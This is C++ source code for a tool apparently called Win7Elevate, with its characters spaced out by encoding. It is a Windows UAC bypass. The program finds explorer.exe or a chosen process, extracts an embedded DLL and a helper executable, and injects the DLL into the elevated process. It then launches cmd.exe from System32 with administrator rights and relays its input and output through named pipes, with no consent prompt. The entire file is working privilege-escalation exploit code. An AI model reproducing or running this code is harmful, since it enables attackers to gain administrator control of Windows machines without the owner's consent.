# i n c l u d e   " s t d a f x . h " 
 
 # i n c l u d e   " r e s o u r c e . h " 
 
 # i n c l u d e   " W i n 7 E l e v a t e _ U t i l s . h " 
 
 # i n c l u d e   " W i n 7 E l e v a t e _ I n j e c t . h " 
 
 
 
 # i n c l u d e   < i o s t r e a m > 
 
 # i n c l u d e   < s s t r e a m > 
 
 # i n c l u d e   < a l g o r i t h m > 
 
 
 
 # i n c l u d e   " . \ . . \ R e d i r e c t o r . h " 
 
 # i n c l u d e   " . \ . . \ C M M N . h " 
 
 
 
 / / 
 
 / / 	 B y   P a v l o v   P . S .   ( P a v P S ) 
 
 / / 
 
 
 
 
 
 
 
 H A N D L E   P i p e I n   =   N U L L ; 
 
 O V E R L A P P E D   P i p e I n O ; 
 
 
 
 H A N D L E   P i p e O u t   =   N U L L ; 
 
 O V E R L A P P E D   P i p e O u t O ; 
 
 
 
 H A N D L E   P i p e E r r   =   N U L L ; 
 
 O V E R L A P P E D   P i p e E r r O ; 
 
 
 
 / / 
 
 / / 	 I n i t i a l i z e s   n a m e d   p i p e s   t h a t   w i l l   b e   u s e d   f o r   c o n n e c t i o n   w i t h   T I O R 
 
 / / 
 
 b o o l   S e t u p N a m e d P i p e ( ) 
 
 { 
 
 	 P i p e I n O . h E v e n t   =   C r e a t e E v e n t (   N U L L ,   T R U E ,   F A L S E ,   N U L L   ) ; 
 
 	 P i p e I n   =   C r e a t e N a m e d P i p e (   
 
 	 	 S T D I n _ P I P E ,   
 
 	 	 P I P E _ A C C E S S _ D U P L E X   |   F I L E _ F L A G _ F I R S T _ P I P E _ I N S T A N C E   |   F I L E _ F L A G _ W R I T E _ T H R O U G H   |   F I L E _ F L A G _ O V E R L A P P E D ,   
 
 	 	 P I P E _ T Y P E _ B Y T E   |   P I P E _ W A I T ,     
 
 	 	 P I P E _ U N L I M I T E D _ I N S T A N C E S ,   
 
 	 	 0 ,   0 ,   
 
 	 	 N M P W A I T _ U S E _ D E F A U L T _ W A I T ,   
 
 	 	 N U L L   ) ; 
 
 
 
 	 C o n n e c t N a m e d P i p e (   P i p e I n ,   & P i p e I n O   ) ; 
 
 
 
 	 P i p e O u t O . h E v e n t   =   C r e a t e E v e n t (   N U L L ,   T R U E ,   F A L S E ,   N U L L   ) ; 
 
 	 P i p e O u t   =   C r e a t e N a m e d P i p e (   
 
 	 	 S T D O u t _ P I P E ,   
 
 	 	 P I P E _ A C C E S S _ D U P L E X   |   F I L E _ F L A G _ F I R S T _ P I P E _ I N S T A N C E   |   F I L E _ F L A G _ W R I T E _ T H R O U G H   |   F I L E _ F L A G _ O V E R L A P P E D ,   
 
 	 	 P I P E _ T Y P E _ B Y T E   |   P I P E _ W A I T ,     
 
 	 	 P I P E _ U N L I M I T E D _ I N S T A N C E S ,   
 
 	 	 0 ,   0 ,   
 
 	 	 N M P W A I T _ U S E _ D E F A U L T _ W A I T ,   
 
 	 	 N U L L   ) ; 
 
 
 
 	 C o n n e c t N a m e d P i p e (   P i p e O u t ,   & P i p e O u t O   ) ; 
 
 
 
 	 P i p e E r r O . h E v e n t   =   C r e a t e E v e n t (   N U L L ,   T R U E ,   F A L S E ,   N U L L   ) ; 
 
 	 P i p e E r r   =   C r e a t e N a m e d P i p e (   
 
 	 	 S T D E r r _ P I P E ,   
 
 	 	 P I P E _ A C C E S S _ D U P L E X   |   F I L E _ F L A G _ F I R S T _ P I P E _ I N S T A N C E   |   F I L E _ F L A G _ W R I T E _ T H R O U G H   |   F I L E _ F L A G _ O V E R L A P P E D ,   
 
 	 	 P I P E _ T Y P E _ B Y T E   |   P I P E _ W A I T ,     
 
 	 	 P I P E _ U N L I M I T E D _ I N S T A N C E S ,   
 
 	 	 0 ,   0 ,   
 
 	 	 N M P W A I T _ U S E _ D E F A U L T _ W A I T ,   
 
 	 	 N U L L   ) ; 
 
 
 
 	 C o n n e c t N a m e d P i p e (   P i p e E r r ,   & P i p e E r r O   ) ; 
 
 
 
 	 r e t u r n   t r u e ; 
 
 } 
 
 
 
 / / 
 
 / / 	 I n i t i a t e s   d a t a   p u m p i n g . 
 
 / / 
 
 D W O R D   _ _ s t d c a l l   R e d i r e c t o r ( ) 
 
 { 
 
 	 i f   (   ! P i p e I n   ) 
 
 	 	 r e t u r n   - 1 ; 
 
 
 
 	 i f   (   P i p e I n O . h E v e n t   ) 
 
 	 	 W a i t F o r S i n g l e O b j e c t (   P i p e I n O . h E v e n t ,   - 1 0 0 0   ) ; 
 
 	 i f   (   P i p e O u t O . h E v e n t   ) 
 
 	 	 W a i t F o r S i n g l e O b j e c t (   P i p e O u t O . h E v e n t ,   - 1 0 0 0   ) ; 
 
 	 i f   (   P i p e E r r O . h E v e n t   ) 
 
 	 	 W a i t F o r S i n g l e O b j e c t (   P i p e E r r O . h E v e n t ,   - 1 0 0 0   ) ; 
 
 
 
 	 T R e d i r e c t o r P a i r   i n   =   { 0 } ; 
 
 	 i n . S o u r c e   =   G e t S t d H a n d l e ( S T D _ I N P U T _ H A N D L E ) ; 
 
 	 i n . D e s t i n a t i o n   =   P i p e I n ; 
 
 	 i n . L i n u x   =   t r u e ; 
 
 	 i n . N a m e . a s s i g n ( T E X T ( " w 7 e - i n " ) ) ; 
 
 	 i n . T h r e a d =   C r e a t e T h r e a d (   N U L L ,   0 ,   R e d i r e c t o r ,   & i n ,   0 ,   N U L L ) ; 
 
 
 
 	 T R e d i r e c t o r P a i r   o u t   =   { 0 } ; 
 
 	 o u t . D e s t i n a t i o n   =   G e t S t d H a n d l e ( S T D _ O U T P U T _ H A N D L E ) ; 
 
 	 o u t . S o u r c e   =   P i p e O u t ; 
 
 	 o u t . N a m e . a s s i g n ( T E X T ( " w 7 e - o u t " ) ) ; 
 
 	 o u t . T h r e a d =   C r e a t e T h r e a d (   N U L L ,   0 ,   R e d i r e c t o r ,   & o u t ,   0 ,   N U L L ) ; 
 
 
 
 	 T R e d i r e c t o r P a i r   e r r   =   { 0 } ; 
 
 	 e r r . D e s t i n a t i o n   =   G e t S t d H a n d l e ( S T D _ E R R O R _ H A N D L E ) ; 
 
 	 e r r . S o u r c e   =   P i p e E r r ; 
 
 	 e r r . N a m e . a s s i g n ( T E X T ( " w 7 e - e r r " ) ) ; 
 
 	 e r r . T h r e a d =   C r e a t e T h r e a d (   N U L L ,   0 ,   R e d i r e c t o r ,   & e r r ,   0 ,   N U L L ) ; 
 
 
 
 	 H A N D L E   w a i t e r s [ 3 ]   =   {   i n . T h r e a d ,   o u t . T h r e a d ,   e r r . T h r e a d   } ; 
 
 	 W a i t F o r M u l t i p l e O b j e c t s (   3 ,   w a i t e r s ,   F A L S E ,   I N F I N I T E   ) ; 
 
 
 
 	 r e t u r n   0 ; 
 
 } 
 
 
 
 b o o l   I s D e f a u l t P r o c e s s   (   s t d : : p a i r < D W O R D ,   s t d : : w s t r i n g >   p a i r   )   { 
 
 	 r e t u r n   l s t r c m p i (   p a i r . s e c o n d . c _ s t r ( ) ,   T E X T ( " e x p l o r e r . e x e " )   )   = =   0 ; 
 
 } 
 
 
 
 / / 
 
 / / 	 T o   a v o i d   s o m e   p r o b l e m s   w i t h   d e a d l o c k e d   p r o c e s s e s   w e   n e e d   t o   f i n d   w a y   h o w   t o   r u n   p r o g r a m   
 
 / / 	 o n c e   m o r e .   S i n c e   p r o g r a m   u s e s   n a m e d   p a p e s ,   i t   c a n   n o t   b e   s t a r t e d   t w i c e   ( i n   c u r r e n t   r e a l i z a t i o n ) . 
 
 / / 	 S o ,   i f   i n s t a n c e   o f   t h i s   p r o c e s s   a l r e a d y   e x i s t s ,   w e   n e e d   t o   k i l l   i t .   R e g u l a r   e x e ,   s t a r t e d   f r o m   t h e 
 
 / / 	 u s e r ' s   a c c o u n t   h a s   n o   a c c e s s   t o   k i l l   e x i s t i n g   a p p . 
 
 / / 	 H e r e   i   u s e   n a m e d   e v e n t   t o   l i s t e n   f o r   a n d   p e r f o r m   s u i c i d e .   S o ,   i   j u s t   n e e d   t o   s e t   t h i s   e v e n t   ( i f   o n e ) 
 
 / / 	 a n d   a l r e a d y   e x i s t s i n g   a p p   w i l l   k i l l   i t s e l f . 
 
 / / 
 
 D W O R D   W I N A P I   S u i c i d e (   L P V O I D   P a r a m e t e r   )   
 
 { 
 
 	 W a i t F o r S i n g l e O b j e c t (   r e i n t e r p r e t _ c a s t < H A N D L E > (   P a r a m e t e r   ) ,   I N F I N I T E   ) ; 
 
 	 S e t E v e n t (   r e i n t e r p r e t _ c a s t < H A N D L E > (   P a r a m e t e r   )   ) ; 
 
 	 E x i t P r o c e s s (   E X I T _ F A I L U R E   ) ; 
 
 	 
 
 	 r e t u r n   E X I T _ S U C C E S S ; 
 
 } 
 
 
 
 i n t   _ t m a i n ( i n t   a r g c ,   _ T C H A R *   a r g v [ ] ) 
 
 { 
 
 
 
 	 / / 
 
 	 / / 	 L o o k i n g   f o r   s u i c i d e . 
 
 	 / / 
 
 	 H A N D L E   o b j   =   C r e a t e E v e n t (   N U L L ,   F A L S E ,   T R U E ,   T E X T ( " w s 7 S u i c i d e " )   ) ; 
 
 	 i f   (   ! o b j   ) 
 
 	 { 
 
 	 	 E x i t P r o c e s s (   E X I T _ F A I L U R E   ) ; 
 
 	 } 
 
 
 
 	 / / 
 
 	 / / 	 I f   w e   s e e   t h a t   s u i c i d e   e v e n t   i s   i n   r e s e t   s t a t e ,   w e   j u s t   p u l c e   o n e   a n d   w a i t   f o r   
 
 	 / / 	 i t ' s   o w n e r   t o   d i e .   W h e n   i t s   d o n e ,   w e   a c u i r e   t h i s   e v e n t   o b j e c t   a n d   a l s o   s t a r t i n g   l i s t e n i n g   f o r 
 
 	 / / 	 a n y   s i g n a l s   o f   t h i s   o b j e c t . 
 
 	 / / 
 
 	 d o 
 
 	 { 
 
 	 	 D W O R D   r v   =   W a i t F o r S i n g l e O b j e c t (   o b j ,   1 0 0   ) ; 
 
 	 	 i f   (   r v   = =   W A I T _ O B J E C T _ 0   )   b r e a k ; 
 
 
 
 	 	 i f   (   r v   ! =   W A I T _ T I M E O U T   ) 
 
 	 	 { 
 
 	 	 	 E x i t P r o c e s s (   E X I T _ F A I L U R E   ) ; 
 
 	 	 } 
 
 
 
 	 	 P u l s e E v e n t (   o b j   ) ; 
 
 	 	 S l e e p ( 1 0 0 0 ) ;   / /   w e e   n e e d   t o   w a i t ; 
 
 
 
 	 } w h i l e (   t r u e   ) ; 
 
 
 
 	 H A N D L E   h S u i c i d e   =   C r e a t e T h r e a d (   N U L L ,   0 ,   S u i c i d e ,   o b j ,   0 ,   N U L L   ) ; 
 
 	 i f   (   ! h S u i c i d e   ) 
 
 	 { 
 
 	 	 r e t u r n   E X I T _ F A I L U R E ; 
 
 	 } 
 
 
 
 	 d o 
 
 	 { 
 
 	 	 i n t   p a s s _ t h r o u g h _ i n d e x   =   1 ; 
 
 	 	 i f   (   a r g c   < =   p a s s _ t h r o u g h _ i n d e x   ) 
 
 	 	 { 
 
 	 	 	 s t d : : c o u t   < <   " T o o   f e w   a r g u m e n t s "   < <   s t d : : e n d l ; 
 
 	 	 	 b r e a k ; 
 
 	 	 } 
 
 
 
 
 
 	 	 D W O R D   p i d   =   0 ; 
 
 	 	 i f   (   l s t r c m p i (   a r g v [ 1 ] ,   T E X T ( " - - p i d " )   )   = =   0   ) 
 
 	 	 { 
 
 	 	 	 p a s s _ t h r o u g h _ i n d e x   =   3 ; 
 
 	 	 	 i f   (   a r g c   < =   p a s s _ t h r o u g h _ i n d e x   )   
 
 	 	 	 { 
 
 	 	 	 	 s t d : : c o u t   < <   " T o o   f e w   a r g u m e n t s "   < <   s t d : : e n d l ; 
 
 	 	 	 	 b r e a k ; 
 
 	 	 	 } 
 
 
 
 	 	 	 s t d : : w i s t r i n g s t r e a m   p i d _ s t r e a m (   a r g v [ 2 ]   ) ; 
 
 	 	 	 i f   (   !   (   p i d _ s t r e a m   > >   p i d   )   ) 
 
 	 	 	 { 
 
 	 	 	 	 s t d : : c o u t   < <   " I n v a l i d   p i d "   < <   s t d : : e n d l ; 
 
 	 	 	 	 p i d   =   0 ; 
 
 	 	 	 } 
 
 	 	 } 
 
 
 
 	 	 i f   (   !   p i d   ) 
 
 	 	 { 
 
 	 	 	 s t d : : m a p <   D W O R D ,   s t d : : w s t r i n g   >   p r o c s ; 
 
 	 	 	 i f   ( ! W 7 E U t i l s : : G e t P r o c e s s L i s t ( G e t C o n s o l e W i n d o w ( ) ,   p r o c s ) ) 
 
 	 	 	 { 
 
 	 	 	 	 s t d : : c o u t   < <   " U n a b l e   t o   o b t a i n   l i s t   o f   p r o c e s s e s "   < <   s t d : : e n d l ; 
 
 	 	 	 	 b r e a k ; 
 
 	 	 	 } 
 
 
 
 	 	 	 s t d : : m a p <   D W O R D ,   s t d : : w s t r i n g   > : : c o n s t _ i t e r a t o r   i t e r   =   s t d : : f i n d _ i f (   p r o c s . b e g i n ( ) ,   p r o c s . e n d ( ) ,   I s D e f a u l t P r o c e s s   ) ; 
 
 	 	 	 i f   ( i t e r   = =   p r o c s . e n d ( ) ) 
 
 	 	 	 { 
 
 	 	 	 	 s t d : : c o u t   < <   " U n a b l e   t o   f i n d   d e f a u l t   p r o c e s s "   < <   s t d : : e n d l ; 
 
 	 	 	 	 b r e a k ; 
 
 	 	 	 } 
 
 
 
 	 	 	 p i d   =   ( * i t e r ) . f i r s t ; 
 
 	 	 } 
 
 
 
 	 	 T O K E N _ E L E V A T I O N _ T Y P E   g _ t e t   =   T o k e n E l e v a t i o n T y p e D e f a u l t ; 
 
 	 	 i f   ( ! W 7 E U t i l s : : G e t E l e v a t i o n T y p e ( & g _ t e t ) ) 
 
 	 	 { 
 
 	 	 	 _ t p r i n t f ( _ T ( " G e t E l e v a t i o n T y p e   f a i l e d " ) ) ; 
 
 	 	 	 b r e a k ; 
 
 	 	 } 
 
 
 
 	 	 W 7 E U t i l s : : C T e m p R e s o u r c e   d l l R e s o u r c e ( N U L L ,   I D D _ E M B E D D E D _ D L L ) ; 
 
 	 	 s t d : : w s t r i n g   s t r O u r D l l P a t h ; 
 
 	 	 i f   ( ! d l l R e s o u r c e . G e t F i l e P a t h ( s t r O u r D l l P a t h ) ) 
 
 	 	 { 
 
 	 	 	 / / M e s s a g e B o x ( G e t C o n s o l e W i n d o w ( ) ,   L " E r r o r   e x t r a c t i n g   d l l   r e s o u r c e . " ,   L " W 7 E l e v a t e " ,   M B _ O K   |   M B _ I C O N E R R O R ) ; 
 
 	 	 	 b r e a k ; 
 
 	 	 } 
 
 
 
 	 	 / / 
 
 	 	 / / 	 E x t r a c t i o n   T I O R . e x e   f r o m   r e s o u r c e s   a n d   s a v e s   e x e   i n   t h e   f o l d e r   w h e r e   c u r r e n t   a p p l i c a t i o n   
 
 	 	 / / 	 e x i s t s . 
 
 	 	 / / 
 
 	 	 W 7 E U t i l s : : C T e m p R e s o u r c e   T I O R R e s o u r c e ( N U L L ,   I D D _ E M B E D D E D _ T I O R ) ; 
 
 	 	 s t d : : w s t r i n g   s t r O u r T I O R P a t h ; 
 
 	 	 s t d : : w s t r i n g   t i o r ; 
 
 	 	 b o o l   t i o r _ s u c c e e d   =   f a l s e ; 
 
 	 	 i f   ( T I O R R e s o u r c e . G e t F i l e P a t h ( s t r O u r T I O R P a t h ) ) 
 
 	 	 { 
 
 	 	 	 T C H A R   m e _ b u f f [ M A X _ P A T H ] ; 
 
 	 	 	 D W O R D   m e _ c o u n t   =   G e t M o d u l e F i l e N a m e (   N U L L ,   m e _ b u f f ,   M A X _ P A T H   ) ; 
 
 	 	 	 i f   (   m e _ c o u n t   ) 
 
 	 	 	 { 
 
 	 	 	 	 T C H A R   * m e _ t a i l   =   m e _ b u f f   +   m e _ c o u n t   -   1 ; 
 
 	 	 	 	 f o r (   ;   m e _ t a i l   >   m e _ b u f f ;   m e _ t a i l - -   ) 
 
 	 	 	 	 	 i f   (   * m e _ t a i l   = =   ' \ \ '   ) 
 
 	 	 	 	 	 { 
 
 	 	 	 	 	 	 m e _ t a i l + + ; 
 
 	 	 	 	 	 	 * m e _ t a i l   =   0 ; 
 
 	 	 	 	 	 	 b r e a k ; 
 
 	 	 	 	 	 } 
 
 
 
 	 	 	 	 t i o r . a s s i g n ( m e _ b u f f ) ; 
 
 	 	 	 	 t i o r . a p p e n d (   T E X T ( " t i o r . e x e " )   ) ; 
 
 
 
 	 	 	 	 i f   (   C o p y F i l e (   s t r O u r T I O R P a t h . c _ s t r ( ) ,   t i o r . c _ s t r ( ) ,   F A L S E   )   ) 
 
 	 	 	 	 { 
 
 	 	 	 	 	 t i o r _ s u c c e e d   =   t r u e ; 
 
 	 	 	 	 } 
 
 	 	 	 } 
 
 	 	 } 
 
 
 
 	 	 i f   (   t i o r _ s u c c e e d   ) 
 
 	 	 { 
 
 	 	 	 t i o r _ s u c c e e d   =   f a l s e ; 
 
 
 
 	 	 	 C I n t e r p r o c e s s S t o r a g e   * t i o r _ s t o r a g e   =   C I n t e r p r o c e s s S t o r a g e : : C r e a t e (   T E X T ( " w 7 e _ T I O R P a t h " )   ) ; 
 
 	 	 	 i f   (   t i o r _ s t o r a g e   ) 
 
 	 	 	 { 
 
 	 	 	 	 t i o r _ s t o r a g e - > S e t S t r i n g (   t i o r   ) ; 
 
 	 	 	 	 t i o r _ s u c c e e d   =   t r u e ; 
 
 	 	 	 } 
 
 	 	 } 
 
 
 
 	 	 i f   (   ! t i o r _ s u c c e e d   ) 
 
 	 	 { 
 
 	 	 	 / / M e s s a g e B o x ( G e t C o n s o l e W i n d o w ( ) ,   L " E r r o r   e x t r a c t i n g   t i o r   r e s o u r c e . " ,   L " W 7 E l e v a t e " ,   M B _ O K   |   M B _ I C O N E R R O R ) ; 
 
 	 	 	 b r e a k ; 
 
 	 	 } 
 
 
 
 	 	 s t d : : w s t r i n g   a r g s ; 
 
 	 	 f o r   (   i n t   i   =   p a s s _ t h r o u g h _ i n d e x ;   i   <   a r g c ;   i + +   ) 
 
 	 	 { 
 
 	 	 	 b o o l   q   =   w c s s t r ( a r g v [ i ] ,   T E X T ( "   " ) )   | |   w c s s t r ( a r g v [ i ] ,   T E X T ( " \ t " ) ) ; 
 
 
 
 	 	 	 i f   (   q   )   a r g s . a p p e n d (   T E X T ( " \ " " )   ) ; 
 
 	 	 	 a r g s . a p p e n d (   a r g v [ i ]   ) ; 
 
 	 	 	 i f   (   q   )   a r g s . a p p e n d (   T E X T ( " \ " " )   ) ; 
 
 	 	 	 a r g s . a p p e n d (   T E X T ( "   " )   ) ; 
 
 	 	 } 
 
 
 
 	 	 i f   (   ! S e t u p N a m e d P i p e ( )   ) 
 
 	 	 	 s t d : : c o u t   < <   " U n a b l e   t o   s e t u p   n a m e d   p i p e "   < <   s t d : : e n d l ; 
 
 
 
 	 	 / / 
 
 	 	 / / 	 P r e p a r i n g   s h a r e d   v a r i a b l e s   t o   b e   u s e d   b y   T I O R   t h a t   i s   g o i n g   t o   s t a r t   a f t e r   w e   w i l l   i n j e c t 
 
 	 	 / / 	 a n d   l o a d   d l l   i n t o   e l e v a t e d   p r o c e s s . 
 
 	 	 / / 
 
 	 	 C I n t e r p r o c e s s S t o r a g e : : C r e a t e (   T E X T ( " w 7 e _ T I O R S h e l l " ) ,   s t d : : w s t r i n g ( T E X T ( " c m d . e x e " ) )   ) ; 
 
 	 	 C I n t e r p r o c e s s S t o r a g e : : C r e a t e (   T E X T ( " w 7 e _ T I O R A r g s " ) ,   a r g s   ) ; 
 
 	 	 C I n t e r p r o c e s s S t o r a g e : : C r e a t e (   T E X T ( " w 7 e _ T I O R D i r " ) ,   s t d : : w s t r i n g ( T E X T ( " C : \ \ W i n d o w s \ \ S y s t e m 3 2 " ) )   ) ; 
 
 
 
 	 	 W 7 E I n j e c t : : A t t e m p t O p e r a t i o n ( 
 
 	 	 	 G e t C o n s o l e W i n d o w ( ) ,   
 
 	 	 	 t r u e ,   
 
 	 	 	 t r u e ,   
 
 	 	 	 p i d ,   
 
 	 	 	 T E X T ( " n / a " ) ,   
 
 	 	 	 a r g v [ p a s s _ t h r o u g h _ i n d e x ] ,   
 
 	 	 	 a r g s . c _ s t r ( ) ,   
 
 	 	 	 T E X T ( " C : \ \ W i n d o w s \ \ S y s t e m 3 2 " ) ,   
 
 	 	 	 s t r O u r D l l P a t h . c _ s t r ( ) ,   
 
 	 	 	 R e d i r e c t o r ) ; 
 
 
 
 	 	 r e t u r n   E X I T _ S U C C E S S ; 
 
 
 
 	 } w h i l e ( f a l s e ) ; 
 
 
 
 	 r e t u r n   E X I T _ F A I L U R E ; 
 
 } 
 
 